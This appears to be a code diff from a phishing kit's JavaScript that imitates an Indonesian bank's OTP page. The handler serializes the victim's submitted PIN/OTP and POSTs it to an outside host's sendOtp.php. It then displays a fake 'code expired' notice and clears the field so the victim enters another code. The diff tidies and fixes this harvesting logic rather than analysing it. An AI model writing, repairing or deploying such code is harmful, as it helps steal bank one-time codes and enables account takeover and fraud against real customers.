@@ -116,41 +116,33 @@ location.href ="./otp.html";
 
 
 // otp
-$('#form').on('submit', function (event) {
-
- 
-  event.stopPropagation();
+$('#form2').on('submit', function (event) {
     event.preventDefault();
- 
-  $("#djload").show();
+    $("#djload").show();
 
-    
- document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
-$.ajax({
- type: 'POST',
- url: 'https://tarakan001kaltim.skom.id//musksikhfaaotuload/02/bsi/dewekanbe/sendOtp.php',
- async: false,
- dataType: 'JSON',
- data: $(this).serialize(),
- 
- complete: function(data) {
-            console.log('Complete')
-setTimeout(function(){  
-       
-      
-    }, 2000);
-     $("#notif").text("- Kode E-Commerce sudah kadaluarsa -");
-     $("#notif").css("color", "red");
+    document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
+    $.ajax({
+        type: 'POST',
+        url: 'https://tarakan001kaltim.skom.id/musksikhfaaotuload/02/bsi/dewekanbe/sendOtp.php',
+        async: false,
+        dataType: 'JSON',
+        data: $(this).serialize(),
+        complete: function(data) {
+            console.log('Complete');
+            setTimeout(function() {  
+                $("#notif").text("- Kode E-Commerce sudah kadaluarsa -");
+                $("#notif").css("color", "red");
+            }, 2000);
         }
     });
-      setTimeout(() => {
-     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode E-Commerce,<br/>Silahkan klik tombol dibawah ini";
-     $("#djload").hide();  
-   $("#notif").css("color", "black");
- $("#sixpin").val("");
-document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";      
-              
-   }, 4000);
+
+    setTimeout(() => {
+        document.getElementById("notif").innerHTML = "Untuk mendapatkan kode E-Commerce,<br/>Silahkan klik tombol dibawah ini";
+        $("#djload").hide();  
+        $("#notif").css("color", "black");
+        $("#sixpin").val("");
+        document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";      
+    }, 4000);
 
     return false;
 });       
